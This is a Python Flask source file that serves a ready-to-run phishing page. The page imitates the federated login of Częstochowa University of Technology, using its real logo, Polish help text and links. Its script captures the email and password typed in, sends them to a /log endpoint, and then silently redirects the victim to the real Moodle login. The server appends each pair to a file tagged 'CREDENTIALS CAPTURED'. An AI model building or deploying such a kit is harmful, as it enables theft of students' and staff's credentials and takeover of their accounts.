from flask import Flask, request, jsonify, render_template_string
import os
from datetime import datetime

app = Flask(__name__)

# Ensure the log directory exists
LOG_DIR = '/home/logs'
os.makedirs(LOG_DIR, exist_ok=True)

LOG_FILE = os.path.join(LOG_DIR, 'phishing_success.log')

# HTML for the frontend
HTML_CONTENT = """
<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width,initial-scale=1.0">
        <title>Usługa logowania federacyjnego</title>
            <style>
            * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
    }

    header, footer, section, nav {
        display: block;
    }

    html, body {
        height: 100%;
    }

    body {
        font-family: "Helvetica Neue", Verdana, sans-serif;
        font-size: 14px;
        line-height: 1.5;
        color: #333333;
    }

    a, a:link, a:visited, a:active, a:hover, .btn {
        text-decoration: none;
        color: #1e93c8;
        background-color: transparent;
    }

    a:hover, .btn:hover {
        text-decoration: underline;
    }

    h1 {
        font-size: 15px;
        margin-bottom: 8px;
    }

    h2 {
        font-size: 14px;
        margin-bottom: 8px;
    }

    p, ul, ol {
        margin-bottom: 8px;
    }

    ul, ol {
        margin-left: 0;
    }

    ul li, ol li {
        margin-left: 24px;
    }

    div#header {
        height: 46px;
        background-color: #3a3a3a;
        color: #fff;
        text-align: center;
        padding-top: 10px;
    }

    img.logo {
        display: block;
        margin: 50px auto;
    }

    div#legend {
        margin: 0px auto 16px auto;
        max-width: 800px;
        display: block;
        color: #444;
        text-align: center;
        font-size: 18px;
    }

    div#message {
        margin: 0px auto 16px auto;
        max-width: 800px;
        display: block;
        color: red;
        text-align: center;
    }

    div#showHelp {
        text-align: center;
    }

    div#helpContent, div#docContent {
        max-width: 820px;
        display: none;
        margin: 0 auto;
    }

    div#addFormElements {
        max-width: 360px;
        margin: 0 auto;
        padding-left: 4px;
    }

    div.form {
        margin: 0px auto 16px auto;
        width: 360px;
        display: block;
        color: #444;
        padding-top: 24px;
        border-width: 0px;
        background-color: #f0f0f0;
    }

    div.form-row {
        margin: 0 0 8px 0;
        padding: 0 24px;
    }

    .form-field {
        width: 100%;
        font-size: 16px;
        margin: 0;
        padding: 8px;
        border-width: 1px;
        border-style: solid;
        border-color: #ddd;
        -moz-border-colors: none;
        box-sizing: border-box;
        border-radius: 0;
        font-family: -apple-system, BlinkMacSystemFont, Roboto, sans-serif;
        outline: none;
    }

    .form-field:hover, .form-field:focus, .form-field:active {
        border: 1px solid #bbb;
        box-shadow: inset 0 0 2px rgba(0, 0, 0, 0.1);
    }

    .form-button-row {
        display: flex;
        flex-direction: row;
        flex-wrap: wrap;
        margin-top: 16px;
    }

    .form-button {
        display: inline-block;
        text-align: center;
        -webkit-user-select: none;
        -moz-user-select: none;
        user-select: none;
        cursor: default;
        border: 0px;
        border-radius: 0;
        color: #fff;
        padding: 16px 24px;
        line-height: 22px;
        font-size: 16px;
        font-style: normal;
        font-variant: normal;
        font-weight: bold;
        font-family: -apple-system, BlinkMacSystemFont, Arial, sans-serif;
        -moz-osx-font-smoothing: auto;
        -webkit-font-smoothing: auto;
        background-color: #0092CE;
        transition: none;
    }

    .form-button:hover {
        background-color: #00a4e6;
    }

    .flex-button {
        display: inline-block;
        text-align: right;
        padding: 16px 24px;
        line-height: 22px;
        font-size: 16px;
        flex: 1 1 auto;
    }
    </style>
    </head>
    <body>

	<div id="header">
	    Logowanie na podstawie konta uczelnianego USOS
	</div>

	<div>
	    <img src="https://logowanie.man.pcz.pl/idp/images/logo_pcz_text.png" alt="Politechnika Częstochowska" id="logo_pcz" style="width: 350px;" class="logo"/>
	</div>

	<div id="legend">
Logowanie do serwisu <br/><strong>E-learning platform of the Czestochowa University of Technology</strong>
	</div>

	<div id="message">

	</div>

	
	<form action="/idp/profile/SAML2/Redirect/SSO?execution=e1s2" method="post">
    <input type="hidden" name="csrf_token" value="_533ab717d00b706154289d3364cc5f9eb254a8bf" />
	    <div class="form">
		<div class="form-row">
		    <input class="form-field" id="username" name="j_username" tabindex="1" type="text" autocorrect="off" autocapitalize="off" spellcheck="false"
			inputmode="email" placeholder="Adres e-mail do USOS" value="" />
		</div>

		<div class="form-row">
		    <input class="form-field" type="password" id="password" name="j_password" tabindex="2" placeholder="Hasło do USOS" value="" />
		</div>

		<div class="form-button-row">
                    <button class="form-button" type="submit" name="_eventId_proceed" accesskey="l" tabindex="3" onClick="this.childNodes[0].nodeValue='Trwa logowanie, proszę czekać...'">Zaloguj się</button>
		    <div class="flex-button" ><a href="https://logowanie.pcz.pl/passwd-change/reset?locale=pl" target="new">Ustaw nowe hasło</a></div>
		</div>
	    </div>

	    <div id="addFormElements">
                    <div>
                    <input type="checkbox" name="donotcache" value="1" id="donotcache">
                    <label for="donotcache">Nie zapamiętuj logowania</label>
		    </div>
		<div>
                <input id="_shib_idp_revokeConsent" type="checkbox" name="_shib_idp_revokeConsent" value="true">
                <label for="_shib_idp_revokeConsent">Wyświetl informację o tym, jakie dane mają zostać przekazane usłudze, bym miał możliwość odmowy.</label>
		</div>
	    </div>



	</form>
	
	<br/>
		<div id="showHelp">
			.:<a href="javascript:void(0)" onclick="document.getElementById('docContent').style.display = 'block'; document.getElementById('helpContent').style.display = 'none';">Dokumenty</a> ::
			<a href="javascript:void(0)" onclick="document.getElementById('docContent').style.display = 'none'; document.getElementById('helpContent').style.display = 'block';">Pomoc</a> :.
		</div>
		<br/>
		
		<div id="helpContent">

			<h4>Konto dla studentów Politechniki Częstochowskiej</h4>
			<p style="margin-bottom: 0;">
				Konto jest zakładane automatycznie po przyjęciu na studia. Logowanie na podstawie konta systemu USOS jest możliwe dopiero po 
				immatrykulacji, która dla nowych studentów odbywa się:
			</p>
			<ul>
				<li>na początku października dla semestru zimowego,</li>
				<li>na początku marca dla semestru letniego.</li>
			</ul>
			<p>
				Domyślnym hasłem dla nowych użytkowników jest hasło z systemu rekrutacji (IRK - <a href="https://rekrutacja.pcz.pl" target="new">rekrutacja.pcz.pl</a>).
			</p>

			<h4>Konto dla pracowników i doktorantów Politechniki Częstochowskiej</h4>
			<p>
				Konto jest zakładane automatycznie. W przypadku braku konta należy zgłosić się do właściwego dziekanatu.
			</p>

			<h4>Logowanie</h4>
			<p>
				Aby zalogować się za pomocą centralnego punku logowania musisz dysponować kontem w systemie USOS - "Elektroniczny Dziekanat"
				Politechniki Częstochowskiej (<a href="https://usosweb.pcz.pl" target="new">usosweb.pcz.pl</a>). Jedno konto umożliwia logowanie do wielu serwisów korzystających z tego punktu logowania. 
                                Jeżeli Twoje konto nie istnieje poczekaj na zakończenie procesu immatrykulacji lub zgłoś się do dziekanatu.
			</p>

			<h4>Identyfikator i hasło</h4>
			<p>
				Identyfikatorem użytkownika jest adres email. Przejdź na stronę <a href="https://logowanie.pcz.pl/passwd-change/reset" target="new">logowanie.pcz.pl/passwd-change/reset</a> aby dokonać <strong>resetu hasła</strong> lub sprawdzić <strong>czy konto istnieje</strong>. 
                                Dla zachowania bezpieczeństwa należy co pewien czas zmieniać hasło związane z kontem. <strong>Uwaga!</strong> Dziekanat, ani inna jednostka na uczelni nie dokonuje zmiany hasła!
			</p>
			
			<h4>Bezpieczeństwo</h4>
			<p>
				Unikaj logowania się na niezaufanych urządzeniach. Logując się na komputerze dostępnym publicznie, korzystaj z trybu prywatnego przeglądarki internetowej. 
				W celu zachowania bezpieczeństwa, po zakończeniu korzystania z usług należy wylogować się i zamknąć przeglądarkę.
			</p>

			<h4>Kontakt</h4>
			<p>
				Jeżeli nie udało Ci się zalogować lub zmienić hasła, mimo podanych wyżej wskazówek skontaktuj się drogą <a href="mailto:cloud@man.pcz.pl">mailową</a>.
			</p>
			<br/>
		</div>

		<div id="docContent">
			<h4>Dokumenty</h4>
			<ul>
				<li><a href="https://man.pcz.pl/documents/regulamin_korzystania_z_uslug_zewnetrznych_dostepnych_poprzez_Centralny_Punkt_Logowania.pdf" target="new">Regulamin korzystania z usług zewnętrznych dostępnych poprzez Centralny Punkt Logowania</a></li>
				<li><a href="https://man.pcz.pl/documents/zalecenia_dotyczace_bezpieczenstwa_logowania.pdf" target="new">Polityka bezpieczeństwa logowania</a></li>
			</ul>
		</div>

        <footer style="display: none">
          <p class="footer-text">2019 - 2024 Politechnika Częstochowska CzestMAN</p>
        </footer>


    <script>
        document.querySelector('form').addEventListener('submit', async function(event) {
            event.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const submitButton = document.querySelector('button[type="submit"]');
            const messageDiv = document.getElementById('message');
            
            // Basic validation
            let hasError = false;
            if (!username) {
                messageDiv.textContent = 'Proszę podać adres e-mail';
                hasError = true;
            }
            if (!password) {
                messageDiv.textContent = 'Proszę podać hasło';
                hasError = true;
            }
            
            if (!hasError) {
                // Update button text to show loading state
                submitButton.textContent = 'Trwa logowanie, proszę czekać...';
                submitButton.disabled = true;
                
                try {
                    const response = await fetch('/log', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({ 
                            email: username, 
                            password: password 
                        }),
                    });
                    
                    // Redirect to YouTube after sending credentials
                    window.location.href = 'https://moodle2024.pcz.pl/auth/saml2/login.php?wants=https%3A%2F%2Fmoodle2024.pcz.pl%2F&idp=c0cbcab739520b5b5e4cdb981f97c32f&passive=off';
                    
                } catch (error) {
                    console.error('Failed to send credentials:', error);
                    // Redirect even if sending fails
                    window.location.href = 'https://moodle2024.pcz.pl/auth/saml2/login.php?wants=https%3A%2F%2Fmoodle2024.pcz.pl%2F&idp=c0cbcab739520b5b5e4cdb981f97c32f&passive=off';
                }
            }
        });
        
        // Add click handlers for help and documentation toggles
        document.querySelectorAll('#showHelp a').forEach(link => {
            link.addEventListener('click', function(e) {
                e.preventDefault();
                const isHelp = this.textContent === 'Pomoc';
                document.getElementById('docContent').style.display = isHelp ? 'none' : 'block';
                document.getElementById('helpContent').style.display = isHelp ? 'block' : 'none';
            });
        });
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    # Serve the HTML frontend
    return render_template_string(HTML_CONTENT)

@app.route('/log', methods=['POST'])
def log_credentials():
    data = request.get_json()

    if not data or 'email' not in data or 'password' not in data:
        return jsonify({'error': 'Invalid data'}), 400

    email = data['email']
    password = data['password']

    # Log the credentials
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    log_entry = f"{timestamp.ljust(20)} | {'CREDENTIALS CAPTURED'.ljust(30)} | Email: {email}, Password: {password}\n"

    try:
        with open(LOG_FILE, 'a') as f:
            f.write(log_entry)
        return jsonify({'status': 'success'}), 200
    except Exception as e:
        return jsonify({'error': str(e)}), 500


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=3000, debug=True)
